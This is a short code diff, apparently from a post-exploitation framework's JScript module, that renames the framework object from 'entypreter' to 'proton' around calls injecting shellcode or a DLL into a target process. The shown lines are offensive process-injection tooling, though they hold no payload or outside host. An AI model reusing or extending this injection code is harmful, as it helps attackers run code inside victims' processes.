@@ -154,18 +154,18 @@ try {
     if (pid == 0)
     {
         o.InjectDLL(sc, lpParam, ~DLLOFFSET~);
-        entypreter.work.report("Done");
+        proton.work.report("Done");
     }
     else
     {
         var res = o.Inject(sc, pid);
         if (res == 0)
-            entypreter.work.report("Done");
+            proton.work.report("Done");
         else
-            entypreter.work.error("Error");
+            proton.work.error("Error");
     }
 } catch (e) {
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
-entypreter.exit();
+proton.exit();
